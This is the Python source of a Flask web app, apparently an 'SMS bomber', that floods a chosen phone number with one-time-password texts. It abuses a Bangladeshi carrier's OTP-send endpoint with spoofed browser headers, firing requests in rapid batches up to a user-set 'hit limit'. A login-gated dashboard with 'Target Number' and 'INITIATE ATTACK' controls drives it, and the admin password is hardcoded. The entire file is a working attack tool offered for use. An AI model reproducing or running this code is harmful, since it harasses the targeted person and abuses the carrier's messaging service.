import os, asyncio, aiohttp, sqlite3, time, threading
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [CONFIG] ----------
ROBI_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
# রেন্ডার ইউআরএল (সার্ভার সজাগ রাখার জন্য)
APP_URL = "https://rk-bomb.onrender.com"

# ---------- [DATABASE] ----------
def init_db():
    conn = sqlite3.connect('rk_hyper_v5.db')
    conn.execute('CREATE TABLE IF NOT EXISTS users (u TEXT UNIQUE, p TEXT)')
    try:
        conn.execute('INSERT INTO users VALUES (?,?)', ("admin", generate_password_hash("JaNiNaTo-330")))
    except: pass
    conn.commit()
    conn.close()

init_db()

# ---------- [CORE ASYNC ENGINE] ----------
active_missions = {}

async def send_otp_async(session, phone):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Origin": "https://www.robi.com.bd",
        "Referer": "https://www.robi.com.bd/"
    }
    target = phone if phone.startswith("88") else f"88{phone}"
    try:
        async with session.post(ROBI_URL, json={"msisdn": target}, headers=headers, timeout=8) as resp:
            return resp.status == 200
    except:
        return False

async def worker_task(u, phone, limit):
    key = f"{u}_{phone}"
    start_time = datetime.now()
    
    # aiohttp ব্যবহার করে হাই-স্পিড কানেকশন
    async with aiohttp.ClientSession() as session:
        while key in active_missions:
            m = active_missions[key]
            if m['total'] >= limit or m['status'] == 'Terminated':
                break
            
            if m['status'] == 'Running':
                # রান টাইম আপডেট
                elapsed = datetime.now() - start_time
                active_missions[key]['run_time'] = str(elapsed).split('.')[0]
                
                # একসাথে অনেকগুলো রিকোয়েস্ট পাঠানো (চরম গতি)
                batch_size = 5 
                tasks = [send_otp_async(session, phone) for _ in range(batch_size)]
                results = await asyncio.gather(*tasks)
                
                for res in results:
                    active_missions[key]['total'] += 1
                    if res:
                        active_sessions_data = active_missions[key]
                        active_sessions_data['success'] += 1
                
                # প্রগ্রেস ক্যালকুলেশন
                active_missions[key]['progress'] = min(100, int((active_missions[key]['total'] / limit) * 100))
                
                await asyncio.sleep(0.05) # অত্যন্ত কম বিরতি
            else:
                await asyncio.sleep(1) # Pause অবস্থায় অপেক্ষা

    if key in active_missions:
        del active_missions[key]

# ---------- [PREMIUM HACKER UI] ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-V24 HYPER MONITOR</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #050505; --red: #ff3366; --yellow: #ffcc00; --blue: #00d2ff; }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }
        .container { max-width: 480px; margin: auto; padding: 15px; }
        
        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid #1a1a1a; margin-bottom: 20px; }
        .header h1 { font-family: 'Orbitron'; font-size: 16px; color: var(--neon); margin: 0; }
        
        .card { background: #0d0d0d; border-radius: 20px; padding: 25px; border: 1px solid #1a1a1a; box-shadow: 0 0 30px rgba(0,255,204,0.05); }
        h2 { font-family: 'Orbitron'; color: var(--blue); font-size: 14px; text-align: center; margin-bottom: 20px; letter-spacing: 2px; }
        
        input { width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #222; color: var(--neon); border-radius: 12px; outline: none; box-sizing: border-box; font-family: 'Orbitron'; font-size: 12px; }
        input:focus { border-color: var(--neon); }

        .btn-launch { width: 100%; padding: 18px; background: linear-gradient(45deg, var(--blue), var(--neon)); border: none; border-radius: 12px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; color: #000; margin-top: 10px; text-transform: uppercase; box-shadow: 0 0 15px rgba(0,255,204,0.3); }

        .mission-card { background: #000; border: 1px solid #222; border-radius: 15px; padding: 18px; margin-top: 20px; border-left: 5px solid var(--neon); animation: slideIn 0.5s ease; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
        .stat-item { background: #080808; padding: 10px; border-radius: 10px; text-align: center; border: 1px solid #111; }
        .label { color: #555; display: block; font-size: 9px; text-transform: uppercase; margin-bottom: 4px; }
        .value { font-family: 'Orbitron'; font-size: 14px; color: var(--neon); }

        .progress-container { height: 8px; background: #111; border-radius: 10px; margin: 15px 0; overflow: hidden; position: relative; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--blue), var(--neon)); width: 0%; transition: 0.3s; box-shadow: 0 0 10px var(--neon); }
        
        .controls { display: flex; gap: 10px; margin-top: 15px; }
        .btn-ctrl { flex: 1; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 10px; font-family: 'Orbitron'; text-transform: uppercase; }
        .bg-pause { background: var(--yellow); color: #000; }
        .bg-resume { background: var(--blue); color: #000; }
        .bg-stop { background: var(--red); color: #fff; }

        .logout { color: var(--red); text-decoration: none; font-size: 11px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>RK-V24 <span style="color:var(--blue)">HYPER</span></h1>
            <a href="/logout" class="logout">TERMINATE SESSION</a>
        </div>
        [CONTENT]
    </div>

    <script>
        function updateStatus() {
            let area = document.getElementById('monitor-area');
            if(!area) return;
            fetch('/api/status').then(r => r.json()).then(data => {
                let html = '';
                for(let k in data) {
                    let s = data[k];
                    html += `
                    <div class="mission-card">
                        <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                            <span style="color:var(--blue); font-weight:bold; font-family:'Orbitron'; font-size:12px;">TARGET: ${s.phone}</span>
                            <span style="color:${s.status==='Running'?'#00ffcc':'#ffcc00'}; font-size:10px;">● ${s.status}</span>
                        </div>
                        <div class="stat-grid">
                            <div class="stat-item"><span class="label">SUCCESS</span><span class="value">${s.success}</span></div>
                            <div class="stat-item"><span class="label">RUN TIME</span><span class="value">${s.run_time}</span></div>
                        </div>
                        <div class="progress-container"><div class="progress-fill" style="width:${s.progress}%"></div></div>
                        <div style="display:flex; justify-content:space-between; font-size:10px; color:#444; margin-bottom:10px;">
                            <span>STATUS: ROAMING</span>
                            <span>PROGRESS: ${s.progress}%</span>
                        </div>
                        <div class="controls">
                            <button class="btn-ctrl ${s.status==='Running'?'bg-pause':'bg-resume'}" onclick="location.href='/api/control?num=${s.phone}&act=${s.status==='Running'?'Paused':'Running'}'">
                                ${s.status==='Running'?'PAUSE':'RESUME'}
                            </button>
                            <button class="btn-ctrl bg-stop" onclick="location.href='/api/stop?num=${s.phone}'">STOP</button>
                        </div>
                    </div>`;
                }
                area.innerHTML = html;
            });
        }
        setInterval(updateStatus, 1000);
    </script>
</body>
</html>
'''

# ---------- [ROUTES] ----------

@app.route('/')
def dashboard():
    if 'u' not in session: return redirect('/login')
    content = '''
    <div class="card">
        <h2>⚡ HYPER ASYNC ENGINE</h2>
        <form action="/api/start">
            <input name="num" type="tel" placeholder="Target Number (018...)" required>
            <input name="amt" type="number" placeholder="Hit Limit" required>
            <button class="btn-launch">INITIATE ATTACK</button>
        </form>
    </div>
    <div id="monitor-area"></div>
    '''
    return render_template_string(LAYOUT.replace('[CONTENT]', content))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        conn = sqlite3.connect('rk_hyper_v5.db'); conn.row_factory = sqlite3.Row
        user = conn.execute('SELECT * FROM users WHERE u=?', (u,)).fetchone(); conn.close()
        if user and check_password_hash(user['p'], p):
            session['u'] = u; return redirect('/')
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="card"><h2>OPERATOR AUTH</h2><form method="POST"><input name="u" placeholder="Admin ID"><input name="p" type="password" placeholder="Access Key"><button class="btn-launch">ENTER SYSTEM</button></form></div>'))

@app.route('/api/start')
def api_start():
    u, num = session.get('u'), request.args.get('num')
    amt = int(request.args.get('amt') or 0)
    if u and num:
        key = f"{u}_{num}"
        active_missions[key] = {
            'phone': num, 'success': 0, 'total': 0, 'limit': amt, 
            'status': 'Running', 'run_time': '0:00:00', 'progress': 0
        }
        threading.Thread(target=lambda: asyncio.run(worker_task(u, num, amt)), daemon=True).start()
    return redirect('/')

@app.route('/api/status')
def api_status():
    u = session.get('u', '')
    return jsonify({k: v for k, v in active_missions.items() if k.startswith(u)})

@app.route('/api/control')
def api_control():
    key = f"{session.get('u')}_{request.args.get('num')}"
    if key in active_missions:
        active_missions[key]['status'] = request.args.get('act')
    return redirect('/')

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('u')}_{request.args.get('num')}"
    if key in active_missions:
        active_missions[key]['status'] = 'Terminated'
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
